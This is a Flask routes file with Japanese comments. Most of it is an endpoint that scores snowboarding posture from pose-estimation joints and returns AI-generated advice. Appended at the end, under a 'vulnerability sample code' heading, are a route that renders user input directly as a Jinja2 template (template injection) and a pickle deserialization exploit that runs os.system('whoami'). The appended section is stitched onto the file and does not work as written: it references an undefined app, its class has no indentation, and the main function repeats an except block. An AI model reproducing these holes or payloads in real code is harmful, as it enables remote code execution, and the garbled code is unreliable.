# FlaskルーティングとAPI処理

from flask import Blueprint, request, jsonify  # Flaskの基本機能をインポート
from .model_loader import load_models         # モデル読み込み関数
from .inference import run_inference           # 推論実行関数
from .gpt_advice import generate_advice        # アドバイス生成関数
import numpy as np                            # 数値計算ライブラリ
import time
import secrets
import mimetypes

# FlaskのBlueprint（モジュール分割）を作成
main = Blueprint('main', __name__)

# 初回起動時にモデルをロード（毎回DLしない）
image_model, pose_model = load_models()

# 画像を受け取って推論結果を返すエンドポイント
@main.route("/predict", methods=["POST"])
def predict():
    # リクエストに画像ファイルが含まれていなければエラー
    if 'image' not in request.files:
        return jsonify({"error": "画像ファイルが必要です"}), 400

    # 画像ファイルを取得し、バイナリデータに変換
    image_file = request.files['image']
    image_bytes = image_file.read()

    # S3へのアップロードや署名付きURL生成は不要なので削除
    image_url = None

    try:
        # 推論を実行（成功確率、判定、角度情報、関節情報を取得）
        score, result, angles, joints, confidence = run_inference(image_bytes, image_model, pose_model)
        print(f"[DEBUG] joints_count={len(joints)}")

        # 板の使い方・姿勢の詳細スコアを計算
        # --- 板の使い方: ロール角・ピッチ角の絶対値が大きいほど高評価（0~90度で0~100点, 2つの合計）
        roll = abs(angles[0]) if angles and len(angles) > 0 else 0
        pitch = abs(angles[1]) if angles and len(angles) > 1 else 0
        # 0~90度を100点満点でスコア化、30度以上は1.5倍、90度以上は満点扱い
        roll_base = min(roll, 90) / 90 * 50
        pitch_base = min(pitch, 90) / 90 * 50
        roll_score = roll_base * 1.5 if roll >= 30 else roll_base
        pitch_score = pitch_base * 1.5 if pitch >= 30 else pitch_base
        # ankle_scoreは後で加算
        ankle_score = 0

        # 姿勢: 両肘が両腰から離れるほど減点、目線が回転方向を向いていれば加点、足元を見ていれば減点、ノーズ側足首が両腰中間点の下に近いほど加点
        try:
            # MediaPipe: 左肩11, 右肩12, 左腰23, 右腰24, 左膝25, 右膝26, 左肘13, 右肘14, 左目2, 右目5, 左足首27, 右足首28, 頭頂0
            # 両腰の中点
            mid_hip = np.array([
                (joints[23*3+0] + joints[24*3+0]) / 2,
                (joints[23*3+1] + joints[24*3+1]) / 2,
                (joints[23*3+2] + joints[24*3+2]) / 2
            ])
            # 両肘
            l_elbow = np.array([joints[13*3+0], joints[13*3+1], joints[13*3+2]])
            r_elbow = np.array([joints[14*3+0], joints[14*3+1], joints[14*3+2]])
            # 両肘と腰の距離（平均）
            elbow_dist = (np.linalg.norm(l_elbow - mid_hip) + np.linalg.norm(r_elbow - mid_hip)) / 2
            elbow_penalty = min(elbow_dist * 100, 30)  # 離れるほど最大30点減点

            # 追加: 手首-肩の距離（近いほど加点、離れるほど減点）
            l_wrist = np.array([joints[15*3+0], joints[15*3+1], joints[15*3+2]])
            r_wrist = np.array([joints[16*3+0], joints[16*3+1], joints[16*3+2]])
            l_shoulder = np.array([joints[11*3+0], joints[11*3+1], joints[11*3+2]])
            r_shoulder = np.array([joints[12*3+0], joints[12*3+1], joints[12*3+2]])
            lwrist_shoulder_dist = np.linalg.norm(l_wrist - l_shoulder)
            rwrist_shoulder_dist = np.linalg.norm(r_wrist - r_shoulder)
            wrist_shoulder_penalty = min((lwrist_shoulder_dist + rwrist_shoulder_dist) / 2 * 100, 20)  # 最大20点減点
            # elbow_penaltyに加算
            elbow_penalty += wrist_shoulder_penalty

            # 顔中心（鼻・両目・両耳・口・頭頂の平均）
            face_indices = [0, 2, 5, 7, 8, 9, 10]  # 鼻, 左目, 右目, 左耳, 右耳, 口左, 口右
            face_points = [np.array([joints[i*3+0], joints[i*3+1], joints[i*3+2]]) for i in face_indices]
            face_center = np.mean(face_points, axis=0)
            # 両肩の中点
            mid_shoulder = np.array([
                (joints[11*3+0] + joints[12*3+0]) / 2,
                (joints[11*3+1] + joints[12*3+1]) / 2,
                (joints[11*3+2] + joints[12*3+2]) / 2
            ])
            # 頭頂
            head = np.array([joints[0*3+0], joints[0*3+1], joints[0*3+2]])

            # 体軸（頭-腰中点-膝中点）が雪面（z軸）に対して垂直から離れるほど減点
            # mid_knee: 左膝25, 右膝26
            mid_knee = np.array([
                (joints[25*3+0] + joints[26*3+0]) / 2,
                (joints[25*3+1] + joints[26*3+1]) / 2,
                (joints[25*3+2] + joints[26*3+2]) / 2
            ])
            z_axis = np.array([0, 0, 1])
            # head→mid_hip
            axis1 = mid_hip - head
            axis1_norm = axis1 / (np.linalg.norm(axis1) + 1e-6)
            cos_axis1 = np.dot(axis1_norm, z_axis)
            angle1 = np.degrees(np.arccos(np.clip(cos_axis1, -1, 1)))
            # mid_knee→mid_hip
            axis2 = mid_hip - mid_knee
            axis2_norm = axis2 / (np.linalg.norm(axis2) + 1e-6)
            cos_axis2 = np.dot(axis2_norm, z_axis)
            angle2 = np.degrees(np.arccos(np.clip(cos_axis2, -1, 1)))
            # 90度からのずれの平均で減点
            axis_penalty = int(min((abs(angle1 - 90) + abs(angle2 - 90)) / 2 / 90 * 20, 20))

            # 体軸直線性スコア（頭-腰中点-足首中点のなす角が180度に近いほど加点, 最大30点）
            mid_ankle = np.array([
                (joints[27*3+0] + joints[28*3+0]) / 2,
                (joints[27*3+1] + joints[28*3+1]) / 2,
                (joints[27*3+2] + joints[28*3+2]) / 2
            ])
            v1 = mid_hip - mid_ankle
            v2 = head - mid_hip
            v1_norm = v1 / (np.linalg.norm(v1) + 1e-6)
            v2_norm = v2 / (np.linalg.norm(v2) + 1e-6)
            cos_angle = np.dot(v1_norm, v2_norm)
            angle = np.degrees(np.arccos(np.clip(cos_angle, -1, 1)))
            straightness_score = max(0, min((180 - abs(angle - 180)) / 30 * 30, 30))  # 180度に近いほど最大30点
            # 進行方向ベクトル（腰→肩）
            forward_vec = mid_shoulder - mid_hip
            forward_vec_xy = forward_vec[:2]
            # 新しい目線ベクトル（顔中心→ノーズ側の肩（左肩））
            l_shoulder = np.array([joints[11*3+0], joints[11*3+1], joints[11*3+2]])
            r_shoulder = np.array([joints[12*3+0], joints[12*3+1], joints[12*3+2]])
            gaze_vec = l_shoulder - face_center
            gaze_vec_xy = gaze_vec[:2]
            # 進行方向と目線のなす角
            cos_theta = np.dot(forward_vec_xy, gaze_vec_xy) / (np.linalg.norm(forward_vec_xy) * np.linalg.norm(gaze_vec_xy) + 1e-6)
            gaze_angle = np.degrees(np.arccos(np.clip(cos_theta, -1, 1)))

            # 追加: 目線が肩ラインと平行なら加点
            shoulder_line_vec = r_shoulder - l_shoulder
            shoulder_line_vec_xy = shoulder_line_vec[:2]
            gaze_vec_xy_norm = gaze_vec_xy / (np.linalg.norm(gaze_vec_xy) + 1e-6)
            shoulder_line_vec_xy_norm = shoulder_line_vec_xy / (np.linalg.norm(shoulder_line_vec_xy) + 1e-6)
            cos_shoulder = np.dot(gaze_vec_xy_norm, shoulder_line_vec_xy_norm)
            angle_shoulder = np.degrees(np.arccos(np.clip(abs(cos_shoulder), -1, 1)))  # 0度に近いほど平行
            shoulder_bonus = max(0, 20 - (angle_shoulder / 90 * 20))  # 0度で+20点, 90度で0点

            # 追加: 目線が足元方向なら減点
            gaze_to_ankle_vec = mid_ankle - face_center
            gaze_to_ankle_vec_xy = gaze_to_ankle_vec[:2]
            cos_ankle = np.dot(gaze_vec_xy_norm, gaze_to_ankle_vec_xy / (np.linalg.norm(gaze_to_ankle_vec_xy) + 1e-6))
            angle_ankle = np.degrees(np.arccos(np.clip(cos_ankle, -1, 1)))
            ankle_gaze_penalty = min(abs(angle_ankle) / 90 * 30, 30)  # 足元方向に近いほど最大30点減点

            # 目線が進行方向に近いほど加点、足元（真下）に近いほど減点
            gaze_penalty = min(abs(gaze_angle) / 90 * 30, 30) + ankle_gaze_penalty - shoulder_bonus  # 肩ライン平行なら減点を減らす

            # ノーズ側足首（左足首と仮定）が両腰中点の下（y座標が大きいほど）に近いほど加点
            l_ankle = np.array([joints[27*3+0], joints[27*3+1], joints[27*3+2]])
            ankle_offset = mid_hip[1] - l_ankle[1]  # y座標差
            ankle_score = max(0, min(ankle_offset * 300, 40))  # 近いほど最大40点加点

        except Exception:
            import traceback
            print("[DEBUG][EXCEPTION]", traceback.format_exc())
            # 姿勢スコア計算失敗時はデフォルト値
            elbow_penalty = 0
            gaze_angle = 0
            axis_penalty = 0
            straightness_score = 0
            ankle_score = 0

        # board_scoreにankle_scoreを加算し、最大100点にクリップ
        board_score = int(min(roll_score + pitch_score + ankle_score, 100))

        # 詳細分析用スコアを個別に計算（すべて100点満点の点数表示に統一）
        factors = {
            # 目線（gaze）: 進行方向と目線のなす角から逆スコア化（小数点以下切り捨て）
            "gaze": int(max(0, 100 - (abs(gaze_angle) / 90 * 100))),
            # 体軸（直線性）: straightness_scoreをintで
            "straightness": int(straightness_score),
            # 体軸（地面法線からの距離）: axis_penaltyを逆スコア化しintで
            "axis": int(max(0, 100 - int(axis_penalty) / 20 * 100)),
            # 体軸（腕）: elbow_penaltyを逆スコア化しintで
            "arm": int(max(0, 100 - int(elbow_penalty) / 30 * 100)),
            # 板の反発: 左足首が腰の中点に近いほど高評価（ankle_score）、ロール角・ピッチ角の合計も加味
            "rebound": int(min(ankle_score + roll_score + pitch_score, 100)),
        }

        # スコア定義を渡す
        factor_defs = {
            "gaze": "目線の方向。進行方向に近いほど高評価、足元に近いほど減点。",
            "straightness": "体軸の直線性。頭-腰-足首が一直線に近いほど高評価。",
            "axis": "体軸が地面法線（垂直）からどれだけ離れているか。垂直に近いほど高評価。",
            "arm": "両腕の位置。体幹に近いほど高評価、離れるほど減点。",
            "rebound": "板の反発。左足首が腰の中点に近いほど、ロール角・ピッチ角が大きいほど高評価。"
        }

        # ChatGPTを使ってアドバイスを生成
        advice = generate_advice(score, result, angles, joints, factors, factor_defs)

        # JSON形式で結果を返す
        return jsonify({
            "success": True,
            "score": round(score, 3),
            "result": result,
            "advice": advice,
            "factors": factors,
            "joints": joints,
            "confidence": locals().get("confidence", None)
        })


    except Exception as e:
        # エラー発生時は500番でエラーメッセージを返す
        return jsonify({"error": str(e)}), 500

    except Exception as e:
        # エラー発生時は500番でエラーメッセージを返す
        return jsonify({"error": str(e)}), 500



#脆弱性サンプルコード
@app.route("/")
def index():
            username = request.values.get('username')
            return Jinja2.from_string('Hello ' + username).render()

import os
import _pickle

class Exploit(object):
def __reduce__(self):
return (os.system, ('whoami',))

def serialize_exploit():
shellcode = _pickle.dumps(Exploit())
return shellcode

def insecure_deserialization(exploit_code):
_pickle.loads(exploit_code)

if __name__ == '__main__':
shellcode = serialize_exploit()
insecure_deserialization(shellcode)
